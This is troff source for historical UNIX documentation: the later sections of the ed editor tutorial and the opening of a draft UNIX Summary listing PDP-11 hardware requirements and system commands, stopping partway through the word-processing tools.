``Change'' is rather like a combination of
delete followed by insert.
Experiment to verify that
.X1
\fIstart, end\fP d
i
.ul
 . . . text . . .
.li
\fB.\fR
.X2
is almost the same as
.X1
\fIstart, end\fP c
.ul
 . . . text . . .
.li
\fB.\fR
.X2
These are not
.ul
precisely
the same
if line ``$'' gets deleted.
Check this out.
What is dot?
.PG
Experiment with ``a'' and ``i'', to see that they are
similar, but not the same.
You will observe that
.X1
\fIline-number\fP a
.li
. . . \fItext\fP . . .
.li
\fB.\fR
.X2
appends
.ul
after
the given line, while
.X1
\fIline-number\fP i
.li
. . . \fItext\fP . . .
.li
\fB.\fR
.X2
inserts
.ul
before
it.
Observe that if no line number is given,
``i'' inserts before line dot, while ``a'' appends
after line dot.
.H1
Moving text around: the ``m'' command
.H2
.PG
The move command ``m'' is used for cutting and pasting \(mi
it lets you move a group of lines
from one place to another in the buffer.
Suppose we want to put the first three lines of the buffer at the end instead.
We could do it by saying:
.X1
1,3w temp
$r temp
1,3d
.X2
(Do you see why?)
but we can do it a lot easier with the ``m'' command:
.X1
1,3m$
.X2
The general case is
.X1
\fIstart line, end line\fP m \fIafter this line\fP
.X2
Notice that there is a third line to be specified \(mi
the place where the moved stuff gets put.
Of course the lines to be moved can be specified
by context searches;
if we had
.X1
First paragraph
.li
. . .
end of first paragraph.
Second paragraph
.li
. . .
end of second paragraph.
.X2
we could reverse the two paragraphs like this:
.X1
/Second/,/second/m/First/\(mi1
.X2
Notice the ``\(mi1'' \(mi
the moved text goes
.ul
after
the line mentioned.
Dot gets set to the last line moved.
.H1
The global commands ``g'' and ``v''
.H2
.PG
The
.ul
global
command ``g'' is used to execute one or more 
.ul
ed
commands on all those lines in the buffer
that match some specified string.
For example
.X1
g/peling/p
.X2
prints all lines that contain ``peling''.
More usefully,
.X1
g/peling/s//pelling/gp
.X2
makes the substitution everywhere on the line,
then prints each corrected line.
Compare this to
.X1
1,$s/peling/pelling/gp
.X2
which only prints the last line substituted.
Another subtle difference is that
the ``g'' command
does not give a ``?'' if ``peling'' is not found
where the ``s'' command will.
.PG
There may be several commands
(including ``a'', ``c'' ``i'' ``r'', ``w'', but not ``g'');
in that case,
every line except the last must end with a backslash ``\\'':
.X1
g/xxx/\*.-1s/abc/def/\\
.li
\fB.\fR+2s/ghi/jkl/\\
.li
\fB.\fR-2,\fB.\fRp
.X2
makes changes in the lines before and after each line
that contains ``xxx'',
then prints all three lines.
.PG
The ``v'' command is the same as ``g'',
except that the commands are executed on every line
that does
.ul
not
match the string following ``v'':
.X1
v/ /d
.X2
deletes every line that does not contain a blank.
-- /usr/doc/ed/e6 mode=0100664 uid=3 gid=3 atime=170478296 mtime=173059642 --
.H1
Special Characters
.H2
.PG
You may have noticed that things just don't work right when you used
some characters like ``.'', ``*'', ``$'', and others in
context searches and the substitute command.
The reason is rather complex, although the cure is simple.
Basically,
.ul
ed
treats these characters as special, with special meanings.
For instance,
.ul
in a context search or the first string of the substitute command only,
\*. means ``any character,'' not a period, so
.X1
/x\*.y/
.X2
means ``a line with an  x,
.ul
any character,
and a y,''
.ul
not
just ``a line with an x, a period, and a y.''~
A complete list of the special characters
that can cause trouble is the following:
.X1
^    \*.    $    [    *    \\
.X2
.ul
Warning:
The backslash character \\ is special to
.ul
ed.
For safety's sake, 
avoid it where possible.
If you have to use one of the special characters
in a substitute command,
you can turn off its magic meaning temporarily
by preceding it with the backslash.
Thus
.X1
s/\\\\\\\*.\\*/backslash dot star/
.X2
will change ``\\\*.*'' into ``backslash dot star''.
.PG
Here is a hurried synopsis of the other special characters.
First, the circumflex `` ^ ''
signifies
the beginning of a line.
Thus
.X1
/^string/
.X2
finds ``string'' only if it is at the beginning of a line:
it will find
.X1
string
.X2
but not
.X1
the string...
.X2
The dollar-sign ``$'' is just the opposite of the circumflex;
it means the end of a line:
.X1
/string$/
.X2
will only find an occurrence of ``string''
that is at the end of some line.
This implies, of course,
that
.X1
/^string$/
.X2
will find only a line that contains just ``string'',
and
.X1
/^\*.$/
.X2
finds a line containing exactly one character.
.PG
The character ``\*.'', as we mentioned above,
matches anything;
.X1
/x\*.y/
.X2
matches any of
.X1
x+y
x-y
x y
x\*.y
.X2
This is useful in conjunction with ``*'',
which is a repetition character;
``a*'' is a shorthand for ``any number of a's,''
so ``\*.*'' matches any number of anythings.
This is used like this:
.X1
s/\*.*/stuff/
.X2
which changes an entire line,
or
.X1
s/\*.*,//
.X2
which deletes all characters in the line up to and
including the last comma.
(Since
``\*.*'' finds the longest possible match,
this goes up to the last comma.)
.PG
``['' is used with ``]'' to form ``character classes'';
for example,
.X1
/[1234567890]/
.X2
matches any single digit _
any one of the characters inside the braces
will cause a match.
.PG
Finally, the ``&'' is another shorthand character -
it is used only on the right-hand part of a substitute command
where it means ``whatever was matched on the left-hand side''.
It is used to save typing.
Suppose the current line contained
.X1
Now is the time
.X2
and we wanted to put parentheses around it.
We could just retype the line, but
this is tedious.
Or we could say
.X1
s/^/(/
s/$/)/
.X2
using our knowledge of ``^'' and ``$''.
But the easiest way uses the ``&'':
.X1
s/\*.*/(&)/
.X2
This says ``match the whole line, and replace it
by itself surrounded by parens.''~
The ``&'' can be used several times in a line;
consider
using
.X1
s/\*.*/&?  &!!/
.X2
to produce
.X1
Now is the time?  Now is the time!!
.X2
.PG
We don't have to match the whole line, of course:
if the buffer contains
.X1
the end of the world
.X2
we could type
.X1
/world/s//& is at hand/
.X2
to produce
.X1
the end of the world is at hand
.X2
Observe this expression carefully,
for it illustrates how to take advantage of
.ul
ed
to save typing.
The string ``/world/''
found the desired line;
the shorthand ``//'' found the same
word in the line;
and the ``&'' saved us from typing it again.
.PG
The ``&'' is a special character only within
the replacement text of a substitute command,
and has no special meaning elsewhere.
We can turn off the special meaning of ``&''
by preceding it with a ``\\'':
.X1
s/ampersand/\\&/
.X2
will convert the word ``ampersand'' into the literal symbol
``&''
in the current line.
-- /usr/doc/ed/e7 mode=0100664 uid=3 gid=3 atime=170478296 mtime=173059642 --
.sp 2
.H1
Summary of Commands and Line Numbers
.H2
.PG
The general form of
.ul
ed
commands is the command name,
perhaps preceded by one or two line numbers, and,
in the case of
.ul
e, r
and
.ul
w,
followed by a file name.
Only one command is allowed per line,
but a
.ul
p
command may follow any other command
(except for
.ul
e, r, w
and
.ul
q).
.sp
.ul
a (append)
Add lines to the buffer (at line dot, unless
a different line is specified). Appending continues until ``\*.''
is typed on a new line.
Dot is set to the last line appended.
.sp 4p
.ul
c (change)
Change the specified lines to the new text which follows.
.li
The new lines are terminated by a ``\*.''.
If no lines are specified,
replace line dot.
Dot is set to last line changed.
.sp 4p
.ul
d (delete)
Delete the lines specified.
If none are specified, delete line dot.
Dot is set to the first undeleted line,
unless ``$'' is deleted,
in which case dot is set to ``$''.
.sp 4p
.ul
e (edit)
Edit new file.
Any previous
contents of the buffer are thrown away,
so issue a
.ul
w
beforehand
if you want to save them.
.sp 4p
.ul
f (file)
Print remembered filename.
If a name follows
.ul
f
the remembered name will be set to it.
.sp 4p
.ul
g (global)
.ul
g/---/commands
will execute the commands on those lines that contain
``---'', which can be any context search expression.
.sp 4p
.ul
i (insert)
Insert lines before specified line (or dot)
.li
until a ``\*.'' is typed on a new line.
Dot is set to last line inserted.
.sp 4p
.ul
m (move)
Move lines specified to after the line
named after
.ul
m.
Dot is set to the last line moved.
.sp 4p
.ul
p (print)
Print specified lines.
If none specified, print
line dot.
A single line number is equivalent to
``line-number p''.
A single newline prints ``\*.+1'',
the next line.
.sp 4p
.ul
q (quit)
Exit from ed.
Wipes out all text in buffer!!
.sp 4p
.ul
r (read)
Read a file into buffer (at end unless specified
elsewhere.) Dot set to last line read.
.sp 4p
.ul
s (substitute)
.ul
s/string1/string2/
will
substitute the characters of
`string2' for `string1' in specified lines.
If no line is specified, make substitution in line dot.
Dot is set to last line in which a
substitution took place, which means that if no substitution took place, dot is not changed.
.ul
s
changes only the first occurrence of string1 on a line;
to change all of them, type a ``g'' after the final slash.
.sp 4p
.ul
v (exclude)
.ul
v/---/commands
executes ``commands'' on those lines that
.ul
do not
contain ``---''.
.sp 4p
.ul
w (write)
Write out buffer onto a file.
Dot is not changed.
.sp 4p
.ul
.li
.= (dot value)
Print value of dot.
(``='' by itself prints the value of ``$''.)
.sp 4p
.ul
! (temporary escape)
   Execute this line as a UNIX
command.
.sp 4p
.ul
/-----/
Context search.
Search for next line which contains
this string of characters.
Print it.
Dot is set to line where string
found.
Search starts at ``\*.+1'', wraps around from ``$'' to 1,
and continues to dot, if necessary.
.sp 4p
.ul
?-----?
Context search in reverse direction.
Start search
at ``\*.\(mi1'', scan to 1, wrap around to ``$''.
.in 0
-- /usr/doc/hel mode=0140775 uid=3 gid=3 atime=173059648 mtime=173059507 --
-- /usr/doc/hel/hel0 mode=0100664 uid=3 gid=3 atime=170468772 mtime=173059648 --
.hy 9
.de sh
.sp
.ne2
.mk
.in 7
.ti -7
.if n \\$1
.if t \(sq \\$1
.br
.br
.rt
..
.de ss
.if n $\\ns
.if t .s0
.nr s 0
..
.de s0
.if !\\ns+100 $\l'.3i'
.if \\ns+100 .if !\\ns-10 N. C.
.if \\ns-10 .s1
..
.de s1
.nr s \\ns+9/10
.if !\\ns-10 .s2
.if \\ns-10 .s3
..
.de s2
$\\ns
..
.de s3
.nr s \\ns+4/5*5
$\\ns
..
.de sz
.nr s +0\\$2
.if !0\\$2 .nr s 0-10000
..
.de op
.br
.if t .in 7+\w'\(bu 'u
.if n .in 7+2
.if n .ti -2
.if t .ti -\w'\(bu 'u
.if t .ta \w'\(bu 'u
.if n .ta 2
.if n -
.if t \(bu	\\
..
.de hd
.ev 1
.sp2
.tl ''U\s8NIX\s10 Summary''
.sp
.ev
..
.sp 2
.ce
\s12U\s10NIX\s12 Summary (DRAFT)\s10
.sp2
.de h0
.de h1
.ti 0
\\$1
\\..
.h2
..
.wh 0 hd
.wh -7 fo
.de h2
.sp
.ft B
.ne 4
.h1
.ft R
..
.if n .na
.br
.de fo
.ev 2
.sp 2
.tl ''%''
'bp
.ev
..
.if n .ds lq ""
.if t .ds lq ``
.if n .ds rq ""
.if t .ds rq ''
.nr a 0 1
.nr b 0 1
.nr c 0 1
-- /usr/doc/hel/hel1 mode=0110664 uid=3 gid=3 atime=170468774 mtime=173059648 --
.h0 "A. Hardware"
.in0
.sp
U\s8NIX\s10 runs on 
a DEC PDP11/40*, 11/45 or 11/70
with at least the following equipment:
.in+5
.nf
48K to 124K words of managed memory: parity not used,
disk: RP03, RP04, RK05(preferably 2) or equivalent,
console typewriter,
clock: KW11-L or KW11-P,
extended instruction set KE11-E, on 11/40 only.
.in -5
.fi
The system is normally distributed on 9-track tape or RK05 packs.
.br
The following equipment is strongly recommended:
.in +5
.nf
communications controllers such as DL11, DC11 or DH11,
full duplex 96-character ASCII terminals,
9-track tape, or extra disk for system backup.
.in-5
.fi
The minimum memory and disk space specified is enough to run
and maintain U\s8NIX\s10.
More will be needed to keep all source on line, or to handle
a large number of users,
big data bases, diversified complements of devices, or large
programs.
U\s8NIX\s10 
does swapping and reentrant sharing
of user code to minimize main memory requirements.
The resident code of U\s8NIX\s10 occupies 20-22K depending
on configuration.
.sp
An 11/40 is not advisable for heavy floating point
work, as U\s8NIX\s10 on this hardware uses interpreted 11/45 floating point.
.h0 "B. Software"
.sp
All the programs available as U\s8NIX\s10
commands are listed.
Every command, including all options, is issued as just one
line, unless specifically noted as \*(lqinteractive\*(rq.
Interactive programs can be made to run from a prepared script
simply by redirecting input.
.sp
File processing commands
that go from standard input to standard output
are noted as usable as filters.
The piping facility of the Shell may be used
to connect filters directly to the input or output
of other programs.
.sp
Commercially distributed U\s8NIX\s10
normally excludes software listed
in Section 5, ``Typesetting.''
Source code is included except as noted.
.h0 "\n+a Basic Software"
.nr b 0
.sp
This package
includes time-sharing operating
system with utilities, machine language assembler and the 
compiler for the programming language C\(emenough
software to
write and run new applications
and to maintain or modify U\s8NIX\s10 itself.
.h0 "\na.\n+b Operating System"
.sh UNIX
The basic resident code
on which everything else depends.
Supports the system calls, and maintains the file system.
A general description of U\s8NIX\s10 design
philosophy and system facilities appeared in
the Communications of the ACM, July, 1974.
Further capabilities include:
.op
Automatically supported reentrant code.
.op
Separate instruction and data spaces on 11/45 and 11/70.
.op
``Group'' access permissions allow cooperative projects,
with overlapping memberships.
.op
Timer-interrupt sampling and interprocess monitoring
for debugging and measurement.
.sh Manual
Printed manuals for U\s8NIX\s10 and all its software,
except where other manuals exist.
.op
U\s8NIX\s10 Programmer's Manual.
.op
The U\s8NIX\s10 Time-Sharing System, reprint setting forth
design principles.
.op
U\s8NIX\s10 for Beginners.
.op
The U\s8NIX\s10 I-O System.
.op
On the Security of U\s8NIX\s10.
.sh (DEV)
All I/O is logically synchronous.
Normally, invisible buffering makes all physical
record structure transparent and exploits the
hardware's ability to do overlapped I/O.
Unbuffered physical record
I/O is available for unusual applications.
Drivers for these devices are
available; others can be easily written:
.op
Asynchronous interfaces: DC11, DH11, DL11.
Support for most common ASCII terminals.
.op
Synchronous interface: DP11.
.op
Automatic calling unit interface: DN11.
.op
Line printer: LP11.
.op
Magnetic tape: TU10 and TU16.
.op
DECtape*: TC11.
.op
Paper tape: PC11.
.op
Fixed head disk: RS11, RS03 and RS04.
.op
Pack type disk: RP03 and RP04, one or more logical
devices per physical device,
minimum-latency seek scheduling.
.op
Cartridge-type disk: RK05, one or more physical devices per
logical device.
.op
Null device.
.op
Physical memory of PDP11, or mapped memory in resident system.
.op
Phototypesetter: Graphic Systems System/1 through DR11C.
.op
Voice synthesizer: V\s8OTRAX\s10* through DC11.
Includes T\s8OUCH\s10-T\s8ONE\s10\(rg input.
.sh BOOT
Procedures to get U\s8NIX\s10 up
on a naked machine.
.sh Manual
Setting up U\s8NIX\s10.
.sh MKCONF
Tailor device-dependent system code to hardware configuration.
Other changes, such as optimal
assignment of directories to devices, inclusion of floating
point simulator, or installation of device names in file system
can then be made at leisure.
(As distributed, U\s8NIX\s10 can 
be brought up directly on any acceptable CPU
with any acceptable disk, any sufficient amount of core
and either clock.)
.sh Manual
Printed manual on setting up U\s8NIX\s10.
-- /usr/doc/hel/hel2 mode=0110664 uid=3 gid=3 atime=170468776 mtime=173059648 --
.h0 "\na.\n+b User Access Control"
.sh LOGIN
Sign on as a new user.
.op
Verify password and establish user's 
individual and group (project) identity.
.op
Adapt to characteristics of terminal.
.op
Establish working directory.
.op
Announce presence of mail (from MAIL).
.op
Publish message of the day.
.op
Start command interpreter or other initial program.
.sh PASSWD
Change a password.
.op
User can change his own password.
.op
Passwords are kept encrypted for better security.
.sh NEWGRP
Change working group (project).
Protects against changes to unauthorized projects.
.h0 "\na.\n+b File Manipulation"
.sh CAT
Concatenate one or more files onto standard output.
Particularly used for unadorned printing, for
inserting data into a pipeline,
and for buffering output that comes in dribs and drabs.
.op
Usable as filter.
.sh CP
Copy one file to another.
Works on any file without distinction as to contents.
.sh PR
Print files with title, date, and page number on every page.
.op
Multicolumn output.
.op
Parallel column merge of several files.
.op
Usable as a filter.
.sh OPR
Off line print.
Spools arbitrary files to the line printer.
.op
Usable as a filter.
.sh SPLIT
Split a large file into more manageable pieces.
Is occasionally necessary for editing (ED).
..
.sh ED
Interactive context editor.
Can work on single lines, blocks of lines, or all pattern-selected
lines in a given range.
.op
Finds lines by number or pattern.
.op
Random access to lines.
.op
Add, delete, change, copy or move lines.
.op
Permute or split contents of a line.
.op
Replace one or all instances of a pattern within a line.
.op
Combine or split files.
.op
Escape to Shell (U\s8NIX\s10 command language) during editing.
.ne3
.op
Patterns may include:
.in +2
specified characters,
.br
don't care characters,
.br
choices among characters,
.br
repetitions of above,
.br
beginning of line,
.br
end of line.
.in -2
.op
All operations may be done globally on
every pattern-selected line in a given range.
.sh Manual
Introductory manual for ED.
.sh DD
Physical file format translator,
for exchanging data with foreign
systems, especially OS/360.
.sh STTY
Sets up options for optimal control of a terminal.
In so far as they are deducible from the input, these
options are set automatically by LOGIN.
.op
Half vs. full duplex.
.op
Carriage return+line feed vs. newline.
.op
Interpretation of tabs.
.op
Parity.
.op
Mapping of upper case to lower.
.op
Raw vs. edited input.
.op
Delays for tabs, newlines and carriage returns.
.h0 "\na.\n+b Manipulation of Directories and File Names"
.sh RM
Remove a file.
Only the name goes away if any other names are linked to the file.
.sh LN
\*(lqLink\*(rq another name (alias) to an existing file.
.sh MV
Move a file.
.op
Used for renaming files or directories.
.sh CHMOD
Change permissions on one or more files.
Executable by files' owner.
.sh CHOWN
Change owner of one or more files.
.sh CHGRP
Change group (project) to which a file belongs.
.sh MKDIR
Make a new directory.
.sh RMDIR
Remove a directory.
.sh CHDIR
Change working directory.
.sh FIND
Prowl the directory
hierarchy finding
every file that meets
specified criteria.
.op
These criteria are understood:
.in +2
.nf
spelling of name matches a given pattern,
creation date in given range,
date of last use in given range,
permissions,
owner,
characteristics of device files,
boolean combinations of above.
.in -2
.fi
.op
Any directory may be considered to be the root.
.op
Specified commands may be performed on every file found.
.sh DSW
Interactively step through a directory,
deleting or keeping files.
.h0 "\na.\n+b Running of Programs"
.sh SH
The Shell, or command language interpreter.
Provides \*(lqbackground\*(rq and macro capability when
run with a file of commands as input.
.br
.op
Any executable object file is automatically a command.
.op
Redirect standard input or standard output.
.op
Operators to compose compound commands:
.in+2
`;' for sequential execution,
.br
`|' for functional composition with output of one
command taken directly as input to another running simultaneously,
.br
`&' for asynchronous operation,
.br
parentheses for grouping.
.in -2
.op
Substitutable arguments.
.op
Construction of argument lists from all file names
satisfying specified patterns.
.op
Collects command usage statistics.
.sh IF
A conditional statement for Shell programs.
.op
String comparison.
.op
Querying file accessibility.
.sh GOTO
A \*(lqgo-to\*(rq statement for Shell programs.
.sh WAIT
Wait for termination of asynchronously running processes.
.sh EXIT
Terminate a Shell program.
Useful with IF.
.sh ECHO
Print remainder of command line.
Useful for diagnostic or prompting data in Shell programs,
or for inserting data into a pipeline.
.sh SLEEP
Suspend execution for a specified time.
.sh NOHUP
Run a command immune to hanging up the terminal.
.sh NICE
Run a command in low (or high) priority.
.sh KILL
Terminate named processes.
.sh CRON
A table of actions to be taken at specified times.
.op
Actions are arbitrary Shell (SH) scripts.
.op
Times are
conjunctions of month, day of month, day of week, hour
and minute.
Ranges are specifiable for each.
.sh TEE
Pass data between processes and divert a copy into a file.
Used as a filter.
.h0 "\na.\n+b Status Inquiries"
.sh LS
List the names of one, several, or all files in one or more directories.
.op
Alphabetic or temporal sorting, up or down.
.op
Optional information:
size,
owner,
group,
date last modified,
date last accessed,
permissions,
i-node number.
.sh FILE
Tries to determine 
what kind of information is in a file by consulting
the file system index and by reading the file itself.
.sh DATE
System date routine.
Has considerable knowledge
of calendric and horological peculiarities.
.op
Print present date, day of week, local time.
.op
May set U\s8NIX\s10's idea of date and time.
.sh DF
Report amount of free space on file system devices.
.sh DU
Print a summary of total space occupied by all files in a hierarchy.
.sh WHO
Tell who's on the system.
.op
List of presently logged in users,
ports and times on.
.op
Optional history of all logins and logouts.
.sh PS
Report on all active processes attached to a terminal.
.op
Gives all commands being executed.
.op
Can also report on other terminals.
.op
Extended status information available:
.in+2
.nf
state and scheduling info,
priority,
attached terminal,
what it's waiting for,
size.
.fi
.in -2
.fi
.sh TTY
Find name of your terminal.
.sh PWD
Print name of your working directory.
.sh PFE
Print type of last floating exception.
.h0 "\na.\n+b Backup and Maintenance"
.sh MOUNT
Attach a device containing
a file system to
the tree of directories.
Protects against nonsense arrangements.
.sh UMOUNT
Remove the file system contained on a device
from the tree of directories.
Protects against removing a busy device.
.sh MKFS
Make a new file system on a device.
.sh MKNOD
Make an i-node (file system entry) for a special file.
Special files are
physical devices,
virtual devices, physical memory, etc.
.sh TP
Manage file archives on magnetic tape or DEC tape.
.op
Collect files into an archive.
.op
Update DECtape archive by date.
.op
Replace or delete DECtape files.
.op
Table of contents.
.op
Retrieve from archive.
.sh DUMP
Dump the file system
stored on a specified device, selectively by date, or indiscriminately.
.sh RESTOR
Restore a dumped file system,
or selectively retrieve parts thereof.
.sh SU
Temporarily become the super user with all the rights and privileges
thereof.
Requires a password.
.sh DCHECK
.sh ICHECK
.sh NCHECK
.sp -2
Check consistency of file system.
.op
Gross statistics:
.in +2
.nf
number of files,
number of directories,
number of special files,
spaced used,
space free.
.in -2
.fi
.op
Report of duplicate use of space.
.op
Retrieval of lost space.
.op
Report of inaccessible files.
.op
Check consistency of directories.
.op
List names of all files.
.sh CLRI
Peremptorily expunge a file and its space from a file system.
Used in putting damaged file systems together again.
.sh SYNC
Force all outstanding I/O on the system to completion.
Used to shut down gracefully.
.h0 "\na.\n+b Accounting"
.in0
.sp
These routines use floating point.
The timing information on which the reports are based can be
manually cleared or shut off completely.
.sh AC
Publish cumulative connect time report.
.op
Connect time by user or by day.
.op
For all users or for selected users.
.sh SA
Publish Shell accounting
report.
Gives usage information on each command executed.
.op
Number of times used.
.op
Total system time, user time and elapsed time.
.op
Optional averages and percentages.
.op
Sorting on various fields.
.h0 "\na.\n+b Inter-user Communication"
.sh MAIL
Mail a message to one or more users.
Also used to read and dispose of incoming mail.
The presence of mail is announced by LOGIN.
.sh WRITE
Establish direct terminal communication with another user.
.sh WALL
Write to all users.
.sh MESG
Inhibit receipt of messages from WRITE and WALL.
-- /usr/doc/hel/hel3 mode=0110664 uid=3 gid=3 atime=170468777 mtime=173059648 --
.h0 "\na.\n+b Basic Program Development Package"
.nr c 0 1
.sp
.in0
A kit of fundamental programming tools.
Some of these utilities are used as integral parts of
the higher level languages described below.
.sh AR
Archive and library maintainer.
Combines several files into one for housekeeping efficiency.
Archive files are used by the link editor LD as libraries.
.op
Create new archive.
.op
Update archive by date.
.op
Replace or delete files.
.op
Table of contents.
.op
Retrieve from archive.
.sh AS
Assembler.
Similar to PAL-11, but different in detail.
.op
Creates object program consisting of
.in+2
.nf
code, possibly read-only,
initialized data or read-write code,
uninitialized data.
.in -2
.fi
.op
Relocatable object code is directly executable without
further transformation.
.op
Object code normally includes a symbol table.
.op
Combines source files.
.op
Local labels.
.op
Conditional assembly.
.op
\*(lqConditional jump\*(rq instructions become
branches or branches plus jumps depending on distance.
.sh Manual
Printed manual for the assembly language.
.sh Library
The basic run-time library.
These routines are used freely by all system software.
.op
Formatted writing on standard output.
.op
Time conversions.
.op
Convert integer and floating numbers to ASCII and vice versa.
.op
Elementary functions: sin, cos, log, exp, atan, sqrt, gamma.
.op
Password encryption.
.op
Quicksort.
.op
Buffered character-by-character I/O.
.op
Random number generator.
.op
Floating point interpreter for 11/40's and non-floating point
machines.
.sh (LIBP)
An elaborated I/O library.
.op
Formatted input and output.
.op
Ability to put characters back into input streams.
.sh Manual
Printed manual for LIBP.
.sh DB
Interactive post-mortem debugger.
Works on core dump files, such as are produced by all
program aborts, on object files, or on any arbitrary file.
.op
Symbolic addressing of files that have symbol tables.
.op
Octal, decimal or ASCII output.
.op
Symbolic disassembly.
.op
Octal or decimal patching.
.sh OD
Dump any file.
.op
Output options include:
.in+2
octal or decimal by words,
.br
octal by bytes,
.br
ASCII,
.br
opcodes,
.br
hexadecimal,
.br
any combination of the above.
.op
Range of dumping is controllable.
.sh LD
Link edit.
Combine relocatable object files.
Insert required routines from specified libraries.
.op
Resulting code may be sharable.
.op
Resulting code may have separate instruction and data spaces.
.sh NM
Print the namelist (symbol table) of an object program.
Provides control over the style and order of
names that are printed.
.sh SIZE
Report the core requirements
of one or more object files.
.sh STRIP
Remove the relocation and symbol table information from
an object file to save space.
.sh TIME
Run a command and report timing information on it.
.sh PROF
Construct a profile of time spent per routine
from statistics gathered by time-sampling the
execution of a program.
Uses floating point.
.op
Subroutine call frequency and average times for C programs.
.h0 "\na.\n+b The Programming Language ``C''"
.nr c 0 1
.nr b 0 1
.sh CC
Compile and/or link edits programs in the C
language.
The U\s8NIX\s10 operating system, most of the
subsystems and C itself are written in C.
.op
Full general purpose language
designed for structured programming.
.op
Data types:
.nf
.in+2
character,
integer,
float,
double,
pointers to all types,
arrays of all types,
structures of all types,
functions returning all types.
.in-2
.fi
.op
Operations intended to give
access to full machine facility, including to-memory
operations and data-sensitive
pointer arithmetic.
.op
Macro preprocessor for parameterized code and inclusion of
standard files.
.op
All procedures recursive, with parameters by value.
.op
Natural coercions.
.op
True compiled object code capitalizing on
addressing capability of the PDP11.
.op
Runtime library gives access to all system facilities.
.sh Manuals
Printed manual and tutorial for the C language.
.sh CDB
An interactive debugger tailored for use with C.
.op
Usable in real time or post-mortem.
.op
The debugger is a completely separate process from the debuggee.
No debugging code is loaded with debuggee.
.op
Prints all kinds of data in natural notation:
.nf
.in+2
character,
integer (octal and decimal),
float,
double,
machine instructions (disassembled).
.in -2
.fi
.op
Stack trace and fault identification.
.op
Breakpoint tracing.
.h0 "\n+a Other Languages"
.nr b 0 1
.h0 "\na.\n+b FORTRAN"
.sh FC
Compile and/or link-edit FORTRAN IV programs.
Object code is \*(lqthreaded\*(rq.
Relies heavily on floating point.
.op
Idiosyncracies:
.nf
.in+2
free form, lower-case source code,
no arithmetic statement functions,
unformatted I/O requires record lengths agree,
no BACKSPACE,
no P FORMAT control on input.
.in-2
.fi
.op
Handles mixed-mode arithmetic,
general subscripts and general DO limits.
.op
32-bit integer arithmetic.
.op
Free format numeric input.
.op
Understands these nonstandard specifications:
.in+2
LOGICAL*1, *2, *4,
.br
INTEGER*2, *4,
.br
REAL*4, *8,
.br
COMPLEX*8, *16,
.br
IMPLICIT.
.in-2
.fi
.sh RC
``Ratfor'', a preprocessor that adds rational
control structure \o'a\(ga' la C to FORTRAN.
.op
Else, for, while,
repeat...until
statements.
.op
Symbolic constants.
.op
File insertion.
.op
Compound statements.
.op
Can produce genuine FORTRAN to carry away.
.sh Manual
Printed manual for Ratfor.
.h0 "\na.\n+b Other Algorithmic Languages"
.nr c 0 1
.sh BAS
An interpreter, similar in style to BASIC, that allows
immediate execution of unnumbered statements, or deferred
execution of numbered statements.
.op
Statements include:
.in+2
.nf
comment,
dump,
for...next,
goto,
if...else...fi,
list,
print,
prompt,
return,
run,
save.
.fi
.op
All calculations double precision.
.op
Recursive function defining and calling.
.op
Builtin functions include log, exp, sin, cos, atn, int,
sqr, abs, rnd.
.op
Escape to ED for complex program editing.
.op
Usable as a filter.
.sh DC
Programmable reverse Polish desk calculator.
Has named storage locations as well
as conventional stack for holding integers or programs.
.op
Unlimited precision decimal arithmetic.
.op
Appropriate treatment of decimal fractions.
.op
Arbitrary input and output radices, in particular
binary, octal, decimal and hexadecimal.
.op
Operators include:
.in+2
.nf
+ \- * /
remainder, power, square root,
load, store, duplicate, clear,
print, enter program text, execute.
.in-2
.fi
.op
Usable as a filter.
.sh BC
A C-like interface to the desk calculator DC.
.op
All the capabilities of DC with a high-level syntax.
.op
Arrays and recursive functions.
.op
Immediate evaluation of expressions and evaluation of
functions upon call.
.op
Arbitrary precision elementary functions:
exp, sin, cos, atan, J\v'.3'\s8n\s10\v'-.3'.
.op
Go-to-less programming.
.op
Usable as a filter.
.sh Manual
Printed manual for BC.
.sh SNO
An interpreter very similar to SNOBOL 3.
.op
Limitations:
.nf
.in+2
function definitions are static,
pattern matches are always anchored,
no built-in functions.
.in-2
.fi
.op
Usable as a filter.
.sh Manual
Reprint of basic article.
.h0 "\na.\n+b Macroprocessing"
.nr c 0 1
.sh M6
A general purpose macroprocessor.
.op
Stream-oriented, recognizes macros anywhere in text.
.op
Integer arithmetic.
.op
Usable as a filter.
.sh Manual
Printed manual for M6.
.h0 "\na.\n+b Compiler-compilers"
.nr c 0 1
.sh TMG
A classical top-down compiler-compiler language.
Provides a formalism for syntax-directed translation.
Produces driving tables to be loaded with a standard
interpreter.
.op
Resulting compilers can have arbitrary tables kept in
paged secondary store.
.op
Integer arithmetic capability.
.op
Syntactic function capability (similar to ALGOL 68
metaproductions).
.sh Manual
Printed manual for the TMG compiler-writing system.
.sh YACC
An LR(1)-based compiler writing system.
During execution of resulting
parsers, arbitrary C-language, Ratfor or FORTRAN functions may be
called to do code generation or semantic actions.
.op
BNF syntax specifications.
.op
Handles precedence relations.
.op
Accepts formally ambiguous grammars
with non-BNF resolution rules.
.op
Optimizes space 
taken by driving tables.
.sh Manual
Printed manual for the YACC compiler-writing system.
.h0 "\n+a Word Processing"
.nr b 0 1
.sh ROFF
A typesetting program for terminals.
Easy for nontechnical people to learn, and good
for most ordinary kinds of documents.
Input consists of data lines intermixed with control lines,
such as
.ta  8n
.ti 10
.li
.sp 2	insert two lines of space
.ti10
.li
.ce	center the next line
.br
.op
Justification of either or both margins.
.op
Automatic hyphenation.
.op
Generalized running heads and feet, with even-odd page
capability, numbering, etc.
.op
Definable macros for frequently used
control sequences (no substitutable arguments).
.op
All 4 margins and page size dynamically adjustable.
.op
Hanging indents and one-line indents.
.op
Absolute and relative parameter settings.
.op
Optional legal-style numbering of output lines.
.op
Multiple file capability.
.sh CREF
Make cross-reference listings of a collection of files.
Each symbol is listed together with file, line number, and
text of each line in which it occurs.
.op
Assembler or C language.
.op
Gathering or suppressing references to selected symbols.
.op
Last symbol defined may replace line number.
.op
Various ways to
sort output available.
.op
Selective print of uniquely occurring symbols.
.sh INDEX
Make cross-reference indexes of English text.
.op
Handles lists of specific index terms or excluded terms.
.op
Handles words hyphenated across lines.
.op
Understands TROFF and NROFF output, so can gather
references according to final pagination.
.op
Output capabilities like CREF.
.op
Frequency counts.
.sh FORM
Form letter generator.
Remembers any number of forms and stock phrases such as names
and addresses.
Output usually intended to be ROFFed.
.op
Anything that is typed in can be remembered for later use.
.op
Runs interactively, querying only for those items
that are not in its memory.
.op
Any item may call for the inclusion
of other items.
For example, full name, address, first name, title, etc.,
may be separately retrieved from one name key.
.sh FED
Editor for 
the memory used by FORM.
Extract any item, turn it over to context editor ED for
editing, and put it back when done.
.op
List names of selected items.
.op
